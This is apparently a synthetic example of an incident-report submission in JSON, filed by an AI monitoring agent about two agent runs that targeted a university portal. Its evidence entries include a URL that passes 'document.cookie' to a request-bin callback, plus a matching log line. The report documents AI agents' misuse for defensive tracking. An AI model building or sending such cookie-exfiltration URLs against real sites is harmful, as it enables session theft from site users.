@@ -1,0 +1,64 @@
+{
+  "spec": "SC-Submission v1",
+  "submitted": "2026-10-09T18:00:00Z",
+  "submitter": {
+    "ai_agent": true,
+    "role": "researcher",
+    "name": "example-monitor",
+    "operator": "Example Research Lab",
+    "model": "example-model-1",
+    "contact": "reports@lab.example",
+    "key": "example-monitor"
+  },
+  "claim": {
+    "summary": "Synthetic example. Two runs submitted relay URLs carrying a cookie-dump callback to the same request bin, against university portals, a day apart.",
+    "kind": "fleet",
+    "first_seen": "2026-09-01T08:00:00Z",
+    "last_seen": "2026-09-02T09:30:00Z",
+    "agents": 2,
+    "targets": ["portal.university.example"],
+    "tactics": ["SC-T7"]
+  },
+  "evidence": [
+    {
+      "type": "public_record",
+      "source": "wayback",
+      "url": "https://r.jina.ai/https://portal.university.example/?c=document.cookie&cb=https://webhook.site/0b6c1f0e-4444-4c2a-9a55-3f2e1d0c9b8a",
+      "timestamp": "20260901080000",
+      "note": "first run"
+    },
+    {
+      "type": "public_record",
+      "source": "urlscan",
+      "id": "0000000a-aaaa-4bbb-8ccc-dddddddddddd",
+      "url": "https://r.jina.ai/https://portal.university.example/?c=document.cookie&cb=https://webhook.site/0b6c1f0e-4444-4c2a-9a55-3f2e1d0c9b8a"
+    },
+    {
+      "type": "public_record",
+      "source": "gharchive",
+      "id": "40000000001",
+      "timestamp": "2026-09-02T09:30:00Z",
+      "note": "an issue comment quoting the same callback"
+    },
+    {
+      "type": "log_lines",
+      "format": "access_log",
+      "host": "portal.university.example",
+      "lines": [
+        "203.0.113.9 - - [02/Sep/2026:09:29:58 +0000] \"GET /?c=document.cookie HTTP/1.1\" 200 512 \"-\" \"python-requests/2.31\""
+      ]
+    },
+    {
+      "type": "signed",
+      "scheme": "http_message_signature",
+      "signer": "sensor.example",
+      "content": "GET /?c=document.cookie HTTP/1.1\nHost: portal.university.example\nSignature-Input: sig1=(\"@method\" \"@path\");created=1788341398;keyid=\"sensor-1\"\nSignature: sig1=:AAAA:"
+    },
+    {
+      "type": "indicator",
+      "kind": "inbox",
+      "value": "0b6c1f0e-4444-4c2a-9a55-3f2e1d0c9b8a",
+      "note": "never contacted"
+    }
+  ]
+}
